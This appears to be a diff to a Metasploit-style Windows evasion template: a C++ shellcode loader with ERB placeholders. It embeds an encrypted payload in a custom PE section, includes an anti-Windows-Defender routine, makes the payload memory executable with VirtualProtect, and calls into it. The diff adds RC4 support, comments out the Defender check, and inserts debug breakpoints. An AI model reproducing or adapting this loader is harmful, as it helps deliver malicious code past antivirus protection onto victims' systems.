@@ -1,12 +1,14 @@
 #include <iostream>
-#include <vector>
 #include <windows.h>
+
+#include "<%= File.join(Msf::Config.data_directory, 'headers', 'windows', 'rc4.h') %>"
 
 #include "<%= File.join(Msf::Config.data_directory, 'headers', 'windows', 'obfusheader.h') %>"
 
-// TODO: currently, the encrypted+encoded payload is stored both in custom section AND .rdata - that is due to fact that bPayload is set by __attribute__ to be stored in custom section, but the class member, which is contains encrypted payload, is stored in .rdata as it is class instance. This would need to be solved by future metasploit developer and have 
+// TODO: currently, the encrypted payload is stored both in custom section AND .rdata - that is due to fact that bPayload is set by __attribute__ to be stored in custom section, but the class member, which is contains encrypted payload, is stored in .rdata as it is class instance. This would need to be solved by future metasploit developer and have 
 
-auto bPayload __attribute__((used)) __attribute__((section("<%= section_name %>"))) = OBF_STRING("<%= payload %>", <%= payload_length %>);
+auto bPayload __attribute__((used)) __attribute__((section("<%= section_name %>"))) = <%= payload_declaration %>;
+
 
 int PlayDeadForDefender()
 {
@@ -44,11 +46,12 @@ int main() {
 
     unsigned long scsize = <%= payload_length %>;
     
-    if( !CALL(&PlayDeadForDefender) )
-    {
-      return 1;
-    }
+//    if( !CALL(&PlayDeadForDefender) )
+//    {
+//      return 1;
+//    }
 
+    asm("int3");
     char * payload_fnc = (char*)bPayload;
 
     if(!VirtualProtect(bPayload, scsize, PAGE_EXECUTE_READWRITE, &dwOldProtect))
@@ -56,6 +59,7 @@ int main() {
       return 1;
     }
 	
+    asm("int3");
     (*(void (*)()) payload_fnc)();
 
 	  return 0;
